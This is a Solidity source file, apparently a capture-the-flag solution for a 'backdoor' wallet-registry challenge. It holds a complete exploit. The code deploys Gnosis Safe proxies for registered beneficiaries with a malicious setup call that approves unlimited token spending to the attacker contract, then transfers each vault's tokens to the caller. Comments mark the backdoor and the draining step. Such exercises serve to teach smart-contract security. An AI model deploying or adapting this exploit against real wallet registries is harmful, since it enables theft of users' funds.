// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {WalletRegistry} from "../backdoor/WalletRegistry.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {IProxyCreationCallback} from "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "hardhat/console.sol";

contract ModuleAttack {
    function openSesame(address tokenAddress, address gnosisSafeFactoryAttack) external {
        // Backdoor
        IERC20(tokenAddress).approve(gnosisSafeFactoryAttack, type(uint256).max);
    }
}

contract GnosisSafeFactoryAttack {
    error GnosisSafeFactoryAttack__VictimeIsNotABeneficiary();

    WalletRegistry private immutable i_walletRegistry;
    ModuleAttack private immutable i_moduleAttack;

    constructor(address _walletRegistryAddress) {
        i_walletRegistry = WalletRegistry(_walletRegistryAddress);
        i_moduleAttack = new ModuleAttack();
    }

    function launchAttack(address[] memory victimes) external {
        // GnosisSafeProxyFactory::createProxyWithCallback() Parameters
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(i_walletRegistry.walletFactory());
        address singleton = i_walletRegistry.masterCopy();
        IProxyCreationCallback callback = IProxyCreationCallback(address(i_walletRegistry));

        // GnosisSafe::setup() Parameters
        address moduleAttack = address(i_moduleAttack);
        address token = address(i_walletRegistry.token());
        address[] memory vaultOwners = new address[](1);
        bytes memory data = "0x";

        for (uint256 i = 0; i < victimes.length; i++) {
            if (!i_walletRegistry.beneficiaries(victimes[i])) {
                revert GnosisSafeFactoryAttack__VictimeIsNotABeneficiary();
            }

            data = abi.encodeWithSignature("openSesame(address,address)", token, address(this));
            vaultOwners[0] = victimes[i];

            // Create a new gnosis vault (to earn prize) but with backdoor (to steal funds)
            GnosisSafeProxy proxy = factory.createProxyWithCallback(
                singleton,
                getFactoryInitializer(vaultOwners, 1, moduleAttack, data), // initializer
                block.timestamp + i, // saltNonce
                callback
            );

            // Empty vault
            IERC20(token).transferFrom(address(proxy), msg.sender, IERC20(token).balanceOf(address(proxy)));
        }
    }

    function getFactoryInitializer(address[] memory _owners, uint256 _threshold, address to, bytes memory data)
        private
        pure
        returns (bytes memory initializer)
    {
        initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            _owners,
            _threshold,
            to, // <= malicious contract that executes backdoor on ModuleManager::setupModules()
            data, // <= here is the backdoor call
            address(0), // no fallbackHandler
            address(0), // no paymentToken
            0, // no payment
            address(0) // no paymentReceiver
        );
    }
}
